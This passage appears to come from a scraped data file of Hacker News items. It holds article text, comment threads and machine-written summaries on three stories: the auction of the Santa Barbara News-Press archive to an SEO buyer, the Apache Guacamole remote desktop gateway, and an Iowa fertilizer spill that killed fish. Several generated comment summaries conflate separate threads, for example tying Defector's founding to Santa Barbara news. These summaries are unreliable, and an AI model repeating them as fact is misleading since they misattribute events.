dubious methods, but the rise of AI-generated content has only supercharged the profitability and proliferation of such so-called “backlink farm” operations. The result of this business model is as predictable as it is disturbing: high-quality online content libraries from across the human experience are impregnated with parasitic paid pablum until only a zombie site remains. Indeed, such sites already teem just below the surface of the relatively well-curated internet most of us use in our daily lives. Ever venture even so far as the second page of Google search results? Increasingly, it’s best not to. Noremo is directly associated with several known zombie websites, including GamblingTimes.com and CricFolks.com (covering the sport of cricket), both of which began life as legitimate news sources before being acquired and reintroduced as AI-generated content farms for SEO. In just the past week, a group of online sleuths uncovered Noremo’s role in the shadowy recent purchase of former popular sports blog Deadspin, previously part of Gawker Media. Perhaps most disturbing of all, in just the past year, an industry trend appears to have kicked off in which a subset of SEO companies has begun to acquire the domain names and historical digital content archives of defunct small-town American newspapers for the express purpose of turning them into highly profitable backlink farms. Iowa’s Clayton County Register and Minneapolis’s Southwest Journal are just two painful recent examples of former local newspapers whose websites and historical archives have been summarily obliterated by this new wave of legalized cyber marauding. And indeed, the Bankruptcy Court’s paper trail seems to confirm that the case of the Santa Barbara News-Press is headed for the same fate. The tentative sale agreement document with Weyaweya, Ltd., shows the Trustee’s scanned signature dated February 16, 2024, three weeks before general notice of the asset sale was made available publicly on March 9, 2024. This supports the likely event that Noremo had been on the hunt for distressed U.S. media companies of repute and independently reached out to the court’s Trustee to suggest auction of the newspaper’s digital estate. The Public Responsibility Despite being private enterprises, newspapers have long been able to operate as if they were a public trust, cultivating loyal readerships by providing critical community reporting, and in exchange collecting revenue from advertisers looking to tap the same audience. The present irony of butchering a historic, high-quality archive representing millions of hours of embedded human labor, in order to feed a temporary advertising clickbait factory, should be lost on no one. The implications of our current situation are distressing. Like a giant sequoia felled for firewood, an authoritative archive of our community is on the brink of being run through the digital woodchipper to provide mulch for websites wanting a fleeting bump in search engine results. If Noremo is successful in this purchase, the Santa Barbara News-Press will go down as but the latest conscript in the manifest of an ever-growing armada of digital ghost ships. Unless we save our history. After all, the archive is our collective memoir, if we can keep it. No complete digital record seems to exist in any other one place — not the Santa Barbara Public Library, UC Riverside’s California Newspaper Project, the Library of Congress, Newspapers.com, or the like. A last chance to win the day will take place at 2 p.m. on April 9 in room 201 of the United States Bankruptcy Court, 1415 State Street, Santa Barbara. There, a live auction will occur whereby the current price of $250,000 may be bested only by in-person bidding. To those community members in a position to purchase the archive and save our decades of stories — heads of our surviving news outlets, managers of local nonprofits, city officials, business leaders, and concerned citizens — time is of the essence. Whether you place the winning bid with intent of returning our community daily to its former glory, or simply to save our records from oblivion, you have the chance to make our history. Sources: A repository of source material is available via the following shared Google Drive. Sat Mar 30, 202409:39am https://www.independent.com/2024/03/29/santa-barbaras-collective-memory-sold-for-kindling/",
    "commentLink": "https://news.ycombinator.com/item?id=39868630",
    "commentBody": "Santa Barbara's collective memory, sold for kindling (independent.com)206 points by shortformblog 13 hours agohidepastfavorite42 comments shortformblog 10 hours agoHey all, just sharing this with a quick note. Recently, I was part of a small group of journalists/researchers who determined that the sports site Deadspin sold to investors with close affiliations with the online gaming affiliate industry in Malta. Eventually, it led to a story in 404 Media that tied specific names to the purchase and highlighted some of their M.O.: https://www.404media.co/who-owns-deadspin-now-lineup-publish... It turns out that one of the key figures in the Deadspin purchase is also attempting to buy a bankrupt newspaper’s website, likely because the domain (NewsPress.com) has a lot of SEO value. That’s what the above story is about. This story is really important, because it is essentially putting a community’s history at risk. To me, it feels like a harbinger of what we could see in the future re: domain purchases. reply ntnsndr 7 hours agoparentOne outcome of the Deadspin mess might be instructive—a group of journalists abandoned it and started Defector, a successful worker co-op. After Quitting Deadspin in Protest, They’re Starting a New Site https://www.nytimes.com/2020/07/28/business/media/deadspin-s... For more context on cooperatives in journalism, see https://quod.lib.umich.edu/m/mij/15031809.0007.203?view=text... reply burkaman 7 hours agorootparent404 Media itself is a similar collective of ex-Vice people, I think pretty directly inspired by Defector. reply AndrewKemendo 5 hours agorootparentprevGlad to see worker cooperatives popping up! reply jonah 9 hours agoparentprevThanks for digging into this and for sharing this article! I hadn't seen this latest twist. I'm friends with a number of the \"paper’s staff who staged a mass walk-out\". Very difficult times. Not mentioned in this article was the staff’s long struggle for union representation which they did finally get much to the ire of the owner. The independent.com (another great, \"generic\", domain name!) has been covering the saga for decades: https://www.independent.com/?s=santa+barbara+news-press reply shortformblog 9 hours agorootparentSad tale. In its own way, as bad as the private equity management we’ve been seeing in chains throughout the country. There has to be a great story as to how these two news sites in the same town got such high-quality domains. reply ryantgtg 6 hours agorootparentWhat’s funny to me is that https://www.noozhawk.com/ (along with others) took up the mantle when the SB News Press went downhill. That domain is not as hot. reply topato 5 hours agorootparentAnd Noozhawk's almost Fark clone design when it first launched was pretty good, I'm not such a fan of what it's become. And it feels like their reporting has gotten a lot more focused on north county, rather than the city of Santa Barbara itself. At least The Independent is still there for Santa Barbara, Goleta, and Isla Vista... reply eru 4 hours agoparentprev> This story is really important, because it is essentially putting a community’s history at risk. To me, it feels like a harbinger of what we could see in the future re: domain purchases. Huh? It's just a domain name. None of the history in none of the archives is going away. reply KennyBlanken 8 hours agoparentprevI chortled at the claim that deadspin is \"beloved\" reply causality0 6 hours agorootparent\"Beloved\" doesn't necessarily mean good journalism. The type of rage-bait that includes trying to publicly shame a Native American child for painting his face in team colors and wearing a family headdress to a football game is likely to make you quite beloved among a certain crowd. reply shortformblog 6 hours agorootparentTo be clear, the “beloved” era (while noting its subjectivity) is in reference to the pre-G/O Media era, which was run under a different editorial direction. That team has since moved to Defector. The controversy you are referencing happened last fall, years after that team had left. reply ilamont 8 hours agoprevPerhaps most disturbing of all, in just the past year, an industry trend appears to have kicked off in which a subset of SEO companies has begun to acquire the domain names and historical digital content archives of defunct small-town American newspapers for the express purpose of turning them into highly profitable backlink farms. Does anyone think that these backlink farms will have much value 2 or 3 years from now? This is not just about the role of AI providing better search results or answers to typical queries. It's also the longstanding decline in relevance of Google search queries gummed up with ads and SEO-optimized junk. reply AndrewKemendo 5 hours agoparentDoesn’t really matter. The people behind this aren’t interested in anything beyond quick dollars reply KennyBlanken 8 hours agoprev> The paper declared bankruptcy on July 21, 2023. In a fitting final insult, the court filing listed more than $116,000 in company assets — an implausibly low valuation — as it was revealed McCaw had previously shifted the real estate property of the newspaper’s historic De la Guerra Plaza headquarters and Goleta printing plant into private LLCs under her control This is also a very standard play in the private equity field. The property (which is usually what they really wanted) is forked off to a different entity, and then that entity charges rent back to the original corp. This is how they kill off assisted living homes. They don't bother with cost-cutting; they just keep jacking the \"rent\" the property-owning corp charges the assisted living facility entity. In desperation to keep the home for residents, the staff cut every cost they can. Cracks in care quickly appear, everyone who can leave does which means lots of lost cash flow and expenses split among fewer residents...at some point there's just no more squeezing possible, the corp misses a rent payment...and that's that. It's also the classic plot for many stories; gang/army strong-arms a village and keeps asking for larger and larger takes of the village's crops, eventually leading to the villagers starving, etc. reply jmholla 7 hours agoparentIt's nuts that this is legal. This is seems so fraudulent to me: giving away your assets to an entity so you can rent them back from that entity. reply Animats 5 hours agorootparentFor retirement communities, it's called \"upstreaming\". Residents of the Hyatt Residences near Stanford litigated that and, after eight years, settled.[1] [1] https://en.wikipedia.org/wiki/Vi_Senior_Living#Litigation [2] https://www.mercurynews.com/2014/02/19/residents-sue-palo-al... reply bbarnett 2 hours agorootparentAmusing for one reason. If you're going to go after a retirement community, I can't think of a worst place. It's actually on Sand Hill Road. Talk about potentially connected people, and people with deep pockets, or whose friends may have deep pockets. Burton Richter, 82, is among the affected residents. In 2005, the 1976 Nobel Laureate in Physics paid an entrance fee of roughly $1.59 million, 90 percent of which was supposed to be refundable. Brilliant. Steal from millionaires and multimillionaires. No possible way they'd be able to hire lawyers. No way their friends and family could. Well, hopefully this does indeed work as a usable judgement in other circumstances. reply db48x 7 hours agorootparentprevWhy wouldn’t it be legal? They own both corporations, and have all the rights in the world to dispose of the property as they see fit. reply josephcsible 4 hours agorootparenthttps://en.wikipedia.org/wiki/Arm%27s_length_principle There are a lot of the cases when the law requires arm's-length transactions, and those transactions definitely aren't arm's-length. reply kstenerud 5 hours agorootparentprevFor the same reason why insider trading and price fixing is illegal: It's a scam to siphon money from others, and in doing so destabilizes the whole system. If you don't protect against this sort of behavior, public confidence erodes and eventually the system collapses because nobody's actually producing anything; they're just scamming each other. Once the rich own everything, your country's productivity and competitiveness falls through the floor (banana republic) because nobody doing the actual work has anything left to strive for other than subsistence. reply bruce511 4 hours agorootparentSeparating assets from liabilities, and cross-charging between related entities often seems to surprise those who don't own and run businesses. But it's basic business 101 which is pretty common everywhere. Think of it this way. You build a business over 40 years, accumulating value along the way. You would be crazy to leave all that accumulated value in a high-risk entity (which a business naturally is.) So periodically the value is separated from the risk. So, for example, a business owning the building is nuts. The building is a different asset class, and should be in its own structure. Any reasonable new owner who acquires a business and building in one bite will move to separate them. This is not scammy or fraud, its the ways things are done and should be done by the original owner. reply downWidOutaFite 1 hour agorootparent\"separating the value from the risk\" is euphemism for removing all financial cushion and making sure the pain of any downturn is borne only by employees and customers, or it could even mean purposefully killing off what is considered to be a worthless business and an inefficient use of assets. It's usually done by monstrous new owners who have zero care for the people or community or legacy that they destroy. Their view of the world is only through maximizing financial calculations. Progressives' general anti-business bias blinds them to the need to protect small to medium businesses from the true capitalist evils such as vulture capitalists. Things like rent control could be useful tools for protecting communities from the devastation that can be caused by financial engineering preying on real businesses. reply bruce511 6 minutes agorootparentI agree that businesses that have unproductive assets become targets for PE takeover. Typically these are small businesses that have kept their assets and business together, without separating them. At some point the value of the asset exceeds the value of the business and it becomes ripe to be bought out, sold for parts, and closed. Thus keeping them bound together makes things worse for employees and customers, not better. Separating them makes it worse for creditors. Specifically creditors are less likely to institute bankruptcy if there are no juicy assets to liquidate. Most small businesses can survive a cash squeeze, at least for a short while, as long as creditors don't preemptively move to shut it down. Equally, business owners are less tempted to over-extend if there is less \"equity in the business\". Obviously they can still borrow against the asset, but that's then a conscious decision. Of course large companies know all this, and do it. Yhe way to protect small businesses from predatory buyouts or creditors is to educate small business owners. eru 4 hours agorootparentprev> For the same reason why insider trading and price fixing is illegal: [...] Insider trading isn't illegal everywhere, and it's not even illegal for the same reasons in different jurisdictions. (Specifically, I know that the reasons are different in eg France and the US.) > If you don't protect against this sort of behavior, public confidence erodes and eventually the system collapses because nobody's actually producing anything; they're just scamming each other. That would be easy to test: compare different market with different degrees and kinds of 'protection' against the ills you mention, and see how confidence differs. I doubt you'll find the kind of correlation you are asserting here. (But, of course, we need to watch out for correlation vs causation.) You don't even need to look at different countries: even in the same country different assets are often traded under different rules. Eg equities vs bonds vs commodities vs commodity futures etc in the US. reply MrVandemar 7 hours agorootparentprev\"Legal\", of course, seldom equals \"moral\", \"ethical\" or even \"right\". In fact, \"legal\" often means \"brazen thievery, but rich and entitled people doing it so that's okay\". reply Teever 6 hours agorootparentprevIt may be illegal if the intent behind it is fraudulent. reply 23B1 6 hours agorootparentprevThere's quite a few reasons that could be illegal, especially if it's trying to avoid debt etc. Not saying that is the case here, but there is such a (very rampant) thing called corporate crime that could violate both the letter and the spirit of the law; the latter certainly warranting some investigation – if not a bit of outrage. reply neilv 4 hours agoparentprev> It's also the classic plot for many stories; And a more general trope: one idea that stuck with me from childhood TV was that badguys were always trying to drive people off their land. (Scooby Doo, A-Team, Airwolf, etc.) But what TV also taught us kids was that, no matter what weapons the badguys bolted onto a trafficopter, the big black attack helicopter of justice would rain Hellfires down upon them. Where are the Airwolves, BA Baracuses, and Mystery Teams that we were promised? reply lotsofpulp 5 hours agoparentprev> The property (which is usually what they really wanted) is forked off to a different entity, and then that entity charges rent back to the original corp. The IRS treats the owner’s basis in an entity differently based on being a business or passive activity. Included in basis for a passive investment is both recourse and nonrecourse debt, while the basis in a business such as a newspaper takes into account the recourse debt. If the business and passive activity are not separated, then if the owners refinance the asset with non recourse debt and distribute additional proceeds, it is a capital gain since the non recourse debt does not increase each partner’s basis. However, if you separate the business activity and passive activity, then the partners can include all the non recourse debt in their basis, and any distribution from refinancing would not be taxable. This is why you typically want your real estate to be a separate entity collecting rent from the entity operating the business. reply moomoo11 5 hours agoparentprevYikes man do MBA types and PE just wake up and think of evil fucked up ways to make money? My dad works at a company run by PE monkeys who are some of the most evil mfs. My dad is a smart guy but he’s an immigrant and he says he can think but he can’t talk. It’s unfortunate but it pisses me off how badly they treat him and others. reply kjkjadksj 10 hours agoprevIt’s a shame these former voices don’t band together more often and just try and run a cheap to host site covering the same local topics. You don’t need to sustain the overhead to print and circulate or even rent an office anymore. I’d pay for that, I’m sure I’m not the only one either. reply jonah 9 hours agoparentThere are other local, online-only news sources which now involve some of the previous Santa Barbara News-Press staff. https://www.independent.com https://www.edhat.com https://www.noozhawk.com https://www.montecitojournal.net etc. reply selimthegrim 9 hours agoparentprevEdhat is a long running local site. reply giblfiz 6 hours agoprevTHIS IS AN OUTRAGE! SOMEONE SHOULD KEEP AN ARCHIVE OF OUR PRECIOUS CULTURAL HERITAGE. They could even keep in on the internet! We could call it the \"Internet Archive\" And with this amazing technology, there could even be a way we could go way back and look at things that were published before, right on the internet as well. We could call it the \"wayback machine\" Oh wait: http://web.archive.org/web/20220322003618/https://newspress.... Seriously though, three out of four times when I see someone crying \"but our precious cultural heritage\" it's something that has already been taken care of by archive.org, or that it would be trivial to have them help out with, instead of trying to force the hand of some corporate giant. Did you know that archive.org even has a special legal exemption to ignore copyright law for archiving software? reply shortformblog 6 hours agoparentRelying on an underfunded nonprofit to protect information incompletely is never going to be as good as having access to the original information source. I could point to many reasons for this, but let me start with just one: The internet has been around as a mainstream entity for just 30 years. The newspaper has 155 years of archives. Those archives have not been put on a number of vintage newspaper archive sites, making this information impossible to access. Have you ever dealt with newspaper archives? Morgues of old content? They are often complex to manage and digitize. The Internet Archive, being asked to manage the literal history of the internet, has a massive backlog. It would be significantly better if someone who actually was up close and had an organizational interest in managing it could do it instead, because that makes the lift far easier to deal with. The Internet Archive is an important tool, but it is not the silver bullet you think it is. It is not a set-it-and-forget-it tool. It is the recovery option of last resort, and it puts a lot of pressure on the organization to treat them as a simple replacement for content that should just be online. Any researcher worth their salt will tell you that. reply dr_kiszonka 5 hours agorootparentIs the Malta-based company vehemently against giving archivists access to the newspaper's archives? I can't imagine they would have any good use for it. reply spit2wind 3 hours agorootparent> Is the Malta-based company vehemently against giving archivists access to the newspaper's archives? I can't imagine they would have any good use for it. Holding it for ransom is one \"good\" use for it. reply Dalewyn 9 hours agoprev [–] I can't help but feel surpassing $250,000.00 at auction is no big deal for a city with ~88,000 residents, in this age of crowdfunding and otherwise asking for donations the old fashioned way. So this is less a question of whether the residents can pay, but rather whether the residents value this archive at all. reply delichon 7 hours agoparentWe'll find out a week from Tuesday. A last chance to win the day will take place at 2 p.m. on April 9 in room 201 of the United States Bankruptcy Court, 1415 State Street, Santa Barbara. There, a live auction will occur whereby the current price of $250,000 may be bested only by in-person bidding. reply goodSteveramos 5 hours agoparentprevCorrect. I think the idea of this article is to raise awareness so the local residents can pony up the cash to save the website. reply gedy 7 hours agoparentprev [–] Not to mention this is Santa Barbara which has a lot of monied residents. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The Santa Barbara News-Press, a historic newspaper, has declared bankruptcy, putting its digital archive in jeopardy of being sold to a foreign company with a history of transforming reputable websites into \"backlink farms\" for SEO.",
      "This unethical SEO practice includes adding paid content to manipulate search engine rankings, potentially compromising the historical accuracy of the community's records.",
      "Citizens are urged to participate in bidding on the archive to safeguard its content and thwart its involvement in exploitative online activities."
    ],
    "commentSummary": [
      "Deadspin was sold to investors in the online gaming affiliate industry, leading to risks for community history.",
      "Workers created a co-op called Defector due to challenges with union representation and local news sites in Santa Barbara.",
      "The article covers separating assets from liabilities in businesses, insider trading, price fixing, and the significance of preserving cultural heritage through archives."
    ],
    "points": 206,
    "commentCount": 42,
    "retryCount": 0,
    "time": 1711743955
  },
  {
    "id": 39867702,
    "title": "Apache Guacamole: Access Desktops Anywhere with Clientless Gateway",
    "originLink": "https://guacamole.apache.org/",
    "originBody": "Apache Guacamole™ Release Archives Documentation FAQ API / Development Guacamole Manual Community Contributing to Guacamole Mailing Lists Bug/Issue Tracker Source Code Security Reports Support Mailing Lists Bug/Issue Tracker Commercial Support ASF ASF Homepage License Thanks Sponsorship Code of Conduct Apache Guacamole is a clientless remote desktop gateway. It supports standard protocols like VNC, RDP, and SSH. We call it clientless because no plugins or client software are required. Thanks to HTML5, once Guacamole is installed on a server, all you need to access your desktops is a web browser. Download Apache Guacamole 1.5.4 Released on 2023-12-07 Access your computers from anywhere Because the Guacamole client is an HTML5 web application, use of your computers is not tied to any one device or location. As long as you have access to a web browser, you have access to your machines. Keep your desktop in the cloud Desktops accessed through Guacamole need not physically exist. With both Guacamole and a desktop operating system hosted in the cloud, you can combine the convenience of Guacamole with the resilience and flexibility of cloud computing. Free and open source Apache Guacamole is and will always be free and open source software. It is licensed under the Apache License, Version 2.0, and is actively maintained by a community of developers that use Guacamole to access their own development environments. We feel this sets us apart from other remote desktop solutions, and gives us a distinct advantage. Built on a well-documented API Apache Guacamole is built on its own stack of core APIs which are thoroughly documented, including basic tutorials and conceptual overviews in the online manual. These APIs allow Guacamole to be tightly integrated into other applications, whether they be open source or proprietary. Community and commercially supported Community support for Apache Guacamole is available through the project's public mailing lists. Dedicated commercial support is also available through third party companies. Copyright © 2024 The Apache Software Foundation, Licensed under the Apache License, Version 2.0. Apache Guacamole, Guacamole, Apache, the Apache feather logo, and the Apache Guacamole project logo are trademarks of The Apache Software Foundation.",
    "commentLink": "https://news.ycombinator.com/item?id=39867702",
    "commentBody": "Apache Guacamole: a clientless remote desktop gateway (apache.org)193 points by thunderbong 15 hours agohidepastfavorite40 comments kayson 14 hours agoI love Guacamole (the food too). I use the software pretty much every day, and have been pretty happy with it. My two main gripes are 1) it doesn't auto focus login/password fields, and 2) if the engine can't keep up with what's displaying on the remote screen, like if a video autoplays, it introduces an enormous amount of input lag, or even drops input events altogether. It makes getting out of that situation rather difficult. reply keepamovin 4 hours agoparentThese are difficult problems and perhaps the modern web has developed at a pace that older tech like RDP has not kept pace with. But Guacamole bucks that trend. Guacamole is good, and I love that it's clientles and works in the browsers, but VNC lacks sound so you need to do that separately. Also the input lag when remote frames increase in frequency is challenging. If you're looking for something lighter weight and possibly smoother and faster (albeit non-free software with a non-commercial option), check out BrowserBox: https://github.com/BrowserBox/BrowserBox Solving input lag, and maintaining responsiveness across a range of bandwidth situations has been one of our priorities and I think we've mostly achieved. We've accomplished this through a combination of sensible heuristics for congestion control, and using WebRTC with a fallback to WebSockets when faster. We also have audio out of the box, no set up required! However there's always room to improve, which is why it makes it so exciting to work on. Depending on how close you are to a server you may encounter lag issues, too. Right now you can play with a free live demo of BrowserBox here (sorry, signup is not supported yet!): https://browse.cloudtabs.net/signupless_session Some other problems we solve that are not always so easy to configure with Guacamole (and are harder to do with an RDP layer in general), but much easier for us as we virtualize the browser itself are first class mobile support. Obviously that's an issue with remoting desktops from small form devices in general, but if a browser is all you need remotely then we got your back! :) Same time, BrowserBox will not be for everyone. It all depends on what you need. Get on touch if you are interested! reply dang 13 hours agoprevRelated: Apache Guacamole - https://news.ycombinator.com/item?id=29442643 - Dec 2021 (116 comments) How to sell open source software: Guacamole case study - https://news.ycombinator.com/item?id=23624340 - June 2020 (29 comments) Apache Guacamole 1.1.0 - https://news.ycombinator.com/item?id=22190251 - Jan 2020 (50 comments) Apache Guacamole – Clientless remote desktop gateway - https://news.ycombinator.com/item?id=21660925 - Nov 2019 (40 comments) Apache Guacamole – A clientless remote desktop gateway - https://news.ycombinator.com/item?id=15778902 - Nov 2017 (41 comments) Guacamole – A clientless remote desktop gateway - https://news.ycombinator.com/item?id=15389727 - Oct 2017 (216 comments) Apache Guacamole - https://news.ycombinator.com/item?id=11744430 - May 2016 (57 comments) Guacamole – HTML5 Clientless Remote Desktop - https://news.ycombinator.com/item?id=8166388 - Aug 2014 (78 comments) Guacamole is an HTML5 + JavaScript (AJAX) viewer for VNC - https://news.ycombinator.com/item?id=1503837 - July 2010 (11 comments) reply outime 14 hours agoprevSeveral years back, I developed an education platform using Apache Guacamole for a startup. Its robust functionality and high level of customization made it an exceptional choice. I can only imagine how much more powerful it has become since then. Kudos to the devs for their invaluable contribution to the OSS community. reply whichfawkes 13 hours agoparentI did the same thing actually. There must be dozens of us! I was continually impressed by how easily and reliably it worked. reply Cyphase 5 hours agoprevWhat a spectacular demo video. The music is on point. It's on the homepage, and here are direct Vimeo links: https://guacamole.apache.org/ https://vimeo.com/116207678 https://player.vimeo.com/video/116207678?title=0&byline=0&po... reply keepamovin 4 hours agoparentInteresting that vimeo says that video is from 9 years ago! I can't wait to see a Guac demo today! reply sparcpile 10 hours agoprevWe've been using Guacamole everywhere after OpenText EOLed Exceed OnDemand and tried to charge way too much for their replacement, FastX. The little bastards even demanded to know what our internal architecture was before they would give us a demo copy to test. We told them politely where to stick it. Ever since then, we've been using Guacamole everywhere and even created an extension called CHIPS. The developer had a good sense of humor for that. reply linuxandrew 12 hours agoprevMy previous workplace used Guacamole, it was pretty good. We used it for both SSH (Linux) and RDP (Windows). My biggest annoyance was trying to break my habit of using ^W to backspace words in bash because it would close the tab in Firefox. reply guerby 5 hours agoparentDoes anyone know how to tell a browser to pass through Ctrl-W ? Would also save me a lot of closed tabs :) reply cess11 52 minutes agorootparentProbably clone the repo and comment it out? It took years of practice but I've made my brain accept Ctrl+Backspace in browser contexts. reply timetraveller26 11 hours agoprevI use xpra for similar purposes (https://github.com/Xpra-org/xpra/) > Xpra is known as \"screen for X\" : its seamless mode allows you to run X11 programs, usually on a remote host, direct their display to your local machine, and then to disconnect from these programs and reconnect from the same or another machine(s), without losing any state. Effectively giving you remote access to individual graphical applications. It can also be used to access existing desktop sessions and start remote desktop sessions. reply neandrake 10 hours agoprevTheir website had just recently gotten a make over, which might be why this was posted. https://github.com/apache/guacamole-website/pull/138 Great project reply farnulfo 14 hours agoprevChrome's console : Refused to frame 'https://player.vimeo.com/' because it violates the following Content Security Policy directive: \"frame-src 'self'\". reply CharlesW 14 hours agoparentUntil the CSP is fixed, you can view it here: https://player.vimeo.com/video/116207678 reply whalesalad 14 hours agorootparentthat chrome - erm - chrome is such a throwback reply adamretter 11 hours agoprevI set this up to provide RDP access to 10 Ubuntu lxde VM's that we used for students on a training course. It worked very well in the browser for the most part, but isn't yet quite as smooth as using Microsoft Remote Desktop client. Very impressive though :-) reply rcarmo 12 hours agoprevI've been looking for an alternative that doesn't need a Java back-end, mostly because I've found that the proxy tends to balloon up with multiple simultaneous connections. In fact, there seems to be a lack of modern web-based RDP client alternatives in general. reply jakestl 12 hours agoparentYears ago I ported some of the Java to Go because we didn't need any of what the Java client was doing: https://github.com/wwt/guac reply rcarmo 9 hours agorootparentYeah, I have that on my favorites, and the sample Vue app. Never found something that worked beyond a demo scenario. reply keepamovin 3 hours agoparentprevBrowserBox uses a lightweight Node async event loop backend and runs across Debian/Ubuntu/RHEL/CentOS/Kali/MacOS and even Windows Server is supported via our PSGallery link. Rather than being an RDP or VNC clone, it just virtualizes the remote browser. BrowserBox is source-available, free for non-commercial (including government/non-profit) use and comes with audio, mobile first, file uploads/downloads and so on out of the box! Try a free demo right now (sorry signups are not open yet!): https://browse.cloudtabs.net/signupless_session reply rcarmo 20 minutes agorootparentNope. Doesn’t work for any real Remote Desktop use case. reply PenguinCoder 9 hours agoparentprevTry KasmWeb[0]. [0] https://kasmweb.com/ reply rcarmo 17 minutes agorootparentI use KasmVNC with some container apps that bundle it, but that doesn’t really match RDP’s feature set. reply guerby 5 hours agoparentprevhttps://github.com/Ylianst/MeshCentral reply rcarmo 19 minutes agorootparentNope. Why would I want an extra agent on each target machine? reply sbt567 11 hours agoparentprevThere's https://rustdesk.com reply rcarmo 9 hours agorootparentI need something that doesn’t reinvent the RDP wheel with less features — i.e., I need real, live RDP connections to existing servers, not a new piece of software to do remote desktops with a different line protocol. reply benarent 7 hours agoprevAt Teleport we had a lot of requests to support Windows / RDP. We ended up building our own Go/Rust Client into our server/web client. This gave more control over the RDP protocol and authentication. https://goteleport.com/blog/desktop-access/ https://goteleport.com/blog/secure-rdp-client/ reply ldoughty 4 hours agoparentGuacamole has supported windows RDP for at least eight years now. (Probably longer, I started using it in 2016 and it had support already) reply PenguinCoder 9 hours agoprevGuacamole was great back when I discovered it and I've used it extensively. I've since replaced it with KasmWeb, and it's much smoother and a better experience. No Java either. reply ranger_danger 12 hours agoprevIs there a similar project that is NOT java? reply jmholla 7 hours agoparentThere are some people talking about some over in this thread: https://news.ycombinator.com/item?id=39869246 reply Zambyte 12 hours agoparentprevWhy? reply necco908 14 hours agoprev [6 more] Worst recipe blog ever. reply Groxx 14 hours agoparentOn the other hand, there are no tales of their youth in the French countryside, picking onions off the bush and eating them raw with a bit of butter. reply vundercind 14 hours agorootparentI should start a food recipe site that’s full of absurd parodies of these stories. All the recipes would be lifted from food packages. I could alter them slightly so they wouldn’t work right unless you read randos’ corrections in the comments. I would never fix the recipe itself. The authentic Web recipe experience! [edit] on reflection, I think I just accidentally described the exact process for creating a “serious” recipe ad-impression-farming website. reply jabl 14 hours agorootparentThere was an amusing blog some years ago where the author ate the serving suggestion pictured on the package. The best one was where he ate raw a rectangular frozen slab of saithe together with a token tiny piece of parsley and a couple of slices of lemon. reply criticalfault 14 hours agoparentprevCan't believe that it has coffee as an ingredient. reply syncbehind 14 hours agoparentprev [–] I chuckled. Thanks reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Apache Guacamole is a clientless remote desktop gateway supporting protocols like VNC, RDP, and SSH, accessible via a web browser for remote desktop access.",
      "The software is open source under the Apache License, continuously enhanced by a developer community, with a documented API for seamless integration with various applications.",
      "Both community and commercial support options are offered for Apache Guacamole."
    ],
    "commentSummary": [
      "Apache Guacamole is a clientless remote desktop gateway for accessing remote desktops via a web browser, receiving praise for its functionality and customization.",
      "Users have reported issues like input lag and sound quality while using Guacamole but have shared positive experiences in education and workplace settings.",
      "Alternative projects like BrowserBox, xpra, and KasmWeb have been discussed, with some users seeking Java-independent solutions, showcasing Guacamole's value for remote desktop access."
    ],
    "points": 193,
    "commentCount": 40,
    "retryCount": 0,
    "time": 1711738790
  },
  {
    "id": 39870402,
    "title": "Iowa fertilizer spill devastates fish in 60-mile river stretch",
    "originLink": "https://www.nytimes.com/2024/03/29/us/iowa-spill-fish-kill.html",
    "originBody": "ADVERTISEMENT SKIP ADVERTISEMENT Iowa Fertilizer Spill Kills Nearly All Fish Across 60-Mile Stretch of Rivers Officials in Iowa and Missouri estimated that nearly 800,000 fish had died in waters that flow into the Missouri River. Share full article 246 Residents looking at the Nishnabotna River in Iowa. A fertilizer spill this month wiped out much of the aquatic life. Credit... Eric Francis/Getty Images By Mitch Smith and Catrin Einhorn March 29, 2024 A fertilizer spill in Iowa this month wiped out much of the aquatic life across a 60-mile stretch of rivers in two states, officials said, leaving an estimated 789,000 fish dead in one of the region’s most ecologically devastating chemical spills in recent years. A Missouri official who surveyed the damage said that the banks of the Nishnabotna River had been lined with fish carcasses, and that dead fish were visible through the water. “I refer to this one as ‘the big one,’” said the official, Matt Combes, an ecological health unit science supervisor for the Missouri Department of Conservation. He added: “Calling something a near-total fish kill for 60 miles of a river is astounding and disheartening.” While fish kills on that scale are unusual, smaller kills are common. Comparing the scope of fish kills across different states is difficult because of limited data and tracking, experts said. The latest die-off started, Iowa officials said, when a valve was left open over a weekend on a storage tank at NEW Cooperative, an agricultural business in Red Oak, in southwestern Iowa. The Iowa Department of Natural Resources, which learned of the spill on March 11, said this week that 265,000 gallons of liquid nitrogen fertilizer spilled into a drainage ditch and into the East Nishnabotna River, which flows into the Nishnabotna River and then the Missouri River. Iowa officials estimated that more than 749,000 fish died in that state. Most of them were small species, such as minnows and shiners, but thousands of larger fish, including catfish and carp, also perished. Mr. Combes, the Missouri official, estimated that around 40,000 fish died in his state. He said he saw large catfish dead, as well as shovelnose sturgeon. The fish kill was one of the five largest on record in Iowa, according to state data, and the worst since runoff from a dairy farm in 2013 killed more than 800,000 fish. The federal Environmental Protection Agency does not keep similar data on the national level, a spokesman said. “People would be surprised how many small to moderate-size kills there are in the United States,” said Andrew Loftus, a fisheries biologist and co-author of a book that is widely used to assess the monetary damages related to small and medium fish kills. “We just don’t have a number of them. But they are happening quite frequently.” Fish kills are often caused by contaminants including fertilizer or industrial chemicals. They can also stem from releases of sewage from water treatment plants or heated water from power plants. On a national scale, the fish kill in Iowa and Missouri was considered a medium to large event, according to fisheries experts. “Certainly the length of river affected is pretty large and the numbers large,” said Gary Whelan, a vice president at the American Fisheries Society, a nonprofit focused on aquatic conservation and fisheries management. “But the biomass affected is likely pretty low as the kill was mostly minnow and chub species.” A spokesman for NEW Cooperative declined to comment on Friday. A spokeswoman for the Iowa Department of Natural Resources declined to make officials available for interviews, citing “anticipated litigation.” The ecosystem could take decades to fully recover, Mr. Loftus said. At the spill site, contaminated soil and tainted water was still being removed, Iowa officials said. Mr. Combes said some pollutants had flowed into the much larger Missouri River, but there had been no immediate fish kill there. Water contamination from agricultural nitrates has been a longstanding issue in Iowa. But the policy changes that environmental advocates desire have been a tough political sell in a state where Republicans run the legislature and farming powers the economy. “I’m not really holding my breath,” said Alicia Vasto, the water program director for the Iowa Environmental Council, a nonprofit group that wants more stringent regulations. “But I really hope that this kind of wakes some people up to the sad situation of our waterways here.” Mitch Smith is a Chicago-based national correspondent for The Times, covering the Midwest and Great Plains. More about Mitch Smith Catrin Einhorn covers biodiversity, climate and the environment for The Times. More about Catrin Einhorn A version of this article appears in print on , Section A, Page 22 of the New York edition with the headline: Iowa Fertilizer Spill Kills Nearly All Fish Across 60-Mile Stretch of Rivers. Order ReprintsToday’s 